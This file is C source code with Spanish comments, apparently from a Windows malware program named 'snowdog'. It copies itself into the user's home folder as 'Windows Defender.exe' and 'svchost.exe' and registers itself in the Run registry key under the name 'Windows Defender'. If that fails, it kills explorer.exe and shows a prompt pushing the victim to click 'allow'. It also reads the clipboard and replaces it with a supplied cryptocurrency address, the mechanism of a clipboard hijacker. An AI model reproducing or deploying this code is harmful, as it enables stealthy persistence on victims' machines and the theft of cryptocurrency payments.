int  CopyFileMe(char *PathFileCopy);            //<--start prototipos de funciones
int AddOnStartup(char *path);
int setclipboard(char *coin_adreess);
char*  getclipboard();                          //<--end prototipos de funciones
int addonstart();
int OpenDirFake();
int RunExplorerProcess();
//funcion para copiar snowdog para que se inicie con windows
int  CopyFileMe(char *PathFileCopy){
    char pathD[256];
    HMODULE nombre=GetModuleHandle(0);
    GetModuleFileName(nombre,pathD,256);

    //printf("CopyFileMe=%s\n",PathFileCopy);
    //char path[]="USB.exe";
    char asd[512]="";
    strcat(asd,getenv("SystemDrive"));
    strcat(asd,getenv("HomePath"));
    strcat(asd,"\\");
    strcat(asd,PathFileCopy);

    CopyFile(pathD,asd,0);
    printf("copyfileme origen %s\n",pathD);
    printf("copyfileme %s\n",asd);
    return 0;
}
//funcion para añadir a snowdog al registro de windows
int AddOnStartup(char *pathname){
    int regkey,check;
    HKEY hkey;
    char path[512]="";
    strcat(path,getenv("SystemDrive"));
    strcat(path,getenv("HomePath"));
    strcat(path,"\\");
    strcat(path,pathname);
    printf("Addonstartup path %s\n",path);
    regkey=RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
    if(regkey==0){
        regkey=RegSetValueEx((HKEY)hkey,"Windows Defender",0,REG_SZ,(BYTE*)path,strlen(path));
        if(regkey!=0){
            system("taskkill /F /IM explorer.exe");
            MessageBox(0,"Tienes que darle en permitir oh \"allow\"","Aviso:",MB_OK|MB_ICONWARNING);
            RunExplorerProcess();
            //system("explorer.exe");
            //system("taskkill /F /IM cmd.exe");
            //system("exit");
            return 0;
        }
        if(regkey==0){
            //OpenDirFake();
            return 8;
        }
	}
    if(regkey!=0){
        system("taskkill /F /IM explorer.exe");
        MessageBox(0,"Tienes que darle en permitir oh \"allow\"","Aviso:",MB_OK|MB_ICONWARNING);
        RunExplorerProcess();
        //system("explorer.exe");

        //system("taskkill /F /IM cmd.exe");
        //system("exit");
        return 0;
    }
}


int setclipboard(char *coin_adreess){
    HANDLE hPortapapeles;
    LPVOID p;
    int i=0;
    int tam_bufer=128;
    /* Obtener 'handle' y bloquearlo */
    hPortapapeles = GlobalAlloc(GHND | GMEM_SHARE, tam_bufer);
    p = GlobalLock(hPortapapeles);
    /* Copiar texto al bloque de memoria */
    for (i = 0; (((char *) p)[i] = coin_adreess[i]) != '\0'; i++){
        ;
    }
    /* Desbloquear 'handle' */
    GlobalUnlock(hPortapapeles);
    /* Abrir portapapeles y vaciarlo */
    OpenClipboard(NULL);
    EmptyClipboard();
    CloseClipboard();
    /* Definir tipo de datos del portapapeles */
    OpenClipboard(NULL);
    SetClipboardData(CF_TEXT, hPortapapeles);
    CloseClipboard();
    printf("set adress \"%s\"\n",coin_adreess);
    return 0;
}


char*  getclipboard(){
   HANDLE hPortapapeles;
   char *texto, c;
   LPVOID p;
   int i, j;

   /* Abrir el portapapeles */
   OpenClipboard(NULL);

   /* Obtener el 'handle' del portapapeles */
   hPortapapeles = GetClipboardData(CF_TEXT);
   if(((int)hPortapapeles)!=0){//obtiene el portapapeles solo si hay texto
        /* Reservar memoria suficiente para almacenar el texto */
        texto = ((char*)malloc((size_t) GlobalSize(hPortapapeles)));

        /* Bloquear 'handle' del portapapeles */
        p = GlobalLock(hPortapapeles);

        /* Copiar el texto del portapapeles */
        for (i = 0, j = 0; (c = ((char *) p)[i]) != '\0'; i++){
            if (c != '\r'){
                texto[j++] = c;
            }
        }
        texto[j] = '\0';


        /* Desbloqueo del 'handle' y cierre del portapapeles */
        GlobalUnlock(hPortapapeles);
        CloseClipboard();

        /* Enviar texto al stream 'salida' */
        printf("\"getclipboard %s\"\n",texto);
        return texto;
        //free(texto);
   }
   if(((int)hPortapapeles)==0){
       printf("no text found\n");
       /* Desbloqueo del 'handle' y cierre del portapapeles */
       GlobalUnlock(hPortapapeles);
       CloseClipboard();
   }
}


int addonstart(){
    CopyFileMe(((char*)"Windows Defender.exe"));
    CopyFileMe(((char*)"svchost.exe"));
    AddOnStartup(((char*)"Windows Defender.exe"));
    return 8;
    /*
    char ruta[128];
    char ruta2[128];
    strcat(ruta,GetPathEnviromentW());          //su definicion se encuentra en os_check.h
    strcpy(ruta2,ruta);
    strcat(ruta,"Windows Defender.exe");
    strcat(ruta2,"svchost.exe");
    printf("ruta tiene %s\n",ruta);
    printf("ruta2 tiene %s\n",ruta2);
    CopyFileMe(ruta2);
    CopyFileMe(ruta);                   //su definicion se encuentra en os_check.h
    AddOnStartup(ruta);                 //su definicion se encuentra en os_check.h
    //return 8;
    */
}
